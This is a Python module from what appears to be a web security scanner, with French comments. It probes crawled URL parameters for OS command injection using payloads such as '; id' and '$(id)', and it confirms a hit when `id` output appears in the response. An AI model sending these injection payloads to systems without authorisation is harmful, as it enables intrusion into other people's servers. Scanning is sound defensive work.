"""Injection de commande OS — payloads classiques sur les paramètres
découverts par le crawl, confirmée par la signature de sortie de `id`."""
from __future__ import annotations

import re

from ..scan_models import Finding
from .base import MAX_TARGETS_PER_MODULE
from ._util import merged_param_targets, with_query_param

CMD_PAYLOADS = ["; id", "| id", "`id`", "$(id)", "& id"]
CMD_MARKER = re.compile(r"uid=\d+\(.*gid=\d+\(")

# Repli intégré : endpoints/paramètres courants toujours sondés, même sans
# rien découvert par le crawl (SPA peu explorable).
COMMON_ENDPOINTS = ["/rest/products/search", "/search", "/api/ping", "/ping"]
COMMON_PARAMS = ["q"]


def t_command_injection(ctx) -> list[Finding]:
    """Sonde CHAQUE (endpoint, paramètre) découvert/repli et confirme TOUTES
    les instances d'injection de commande (une par cible, dès le premier
    payload concluant)."""
    out: list[Finding] = []
    targets = merged_param_targets(ctx.sitemap, ctx.origin, COMMON_ENDPOINTS, COMMON_PARAMS)
    targets = targets[:MAX_TARGETS_PER_MODULE]
    for base_url, param in targets:
        for inj in CMD_PAYLOADS:
            target = with_query_param(base_url, param, "x" + inj)
            st, _, body = ctx.safe_get(target)
            if st in (-1, 404):
                continue
            if CMD_MARKER.search(body or ""):
                out.append(Finding("cmdi", "os-command-injection", "critical", target,
                                   f"Sortie de `id` observée (injection `{inj}`)",
                                   request=f"GET {target}"))
                break
    return out


ATTACKS = [
    ("cmdi", "OS command injection", t_command_injection),
]
